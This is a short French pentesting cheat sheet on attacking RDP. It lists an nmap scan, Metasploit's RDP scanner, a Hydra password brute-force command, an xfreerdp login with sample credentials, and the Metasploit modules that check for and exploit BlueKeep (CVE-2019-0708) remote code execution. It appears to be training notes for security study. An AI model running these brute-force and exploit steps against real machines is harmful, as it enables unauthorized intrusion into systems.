
RDP est un protocole propriétaire d'accès à distance développé par microsoft.  
Il utilise le port 3389 et le protocole de transport TCP.  

RDP a besoin d'un username et password.  
On peut brute forcer l'authentification pour accéder au service.  

La première étape consiste à scanner la cible :  
`nmap -sV -O 10.2.24.86`  

### Scanner RDP Metasploit
utiliser `auxiliary/scanner/rdp/rdp_scanner` (renseigner RHOSTS, RPORT si le port est différent du port par défaut dans le scan)  
Metasploit renvoie la présence d'un service RDP actif et donnera la version de l'OS.  

### Bruteforce avec Hydra  
`hydra -L Users_wordlist.txt -P Passwords_wordlist.txt rdp://IP_target_address -s Port`  
Si la machine cible utilise freexrd, voici la connexion :  
`xfreerdp /u:administrator /p:password123 /v:192.168.1.1`  

### Exploitation de la CVE-2019-0708 - BlueKeep
BlueKeep affecte :  
* XP  
* Vista  
* Windows 7  
* Windows Server 2008 & R2  
  
Après avoir fait un scan et identifié le service RDP ouvert, on lance le module de scanner de Metasploit pour nous indiquer si la cible est vulnérable à cette CVE :  
`use scanner/rdp/cve_2019_0708_bluekeep` set RHOSTS, RPORT...  

Puis exploitation avec :  
`exploit/windows/rdp/cve_2019_0708_bluekeep_rce` set RHOSTS, RPORT...  
`show targets` permet de renseigner la version de Windows manuellement.  
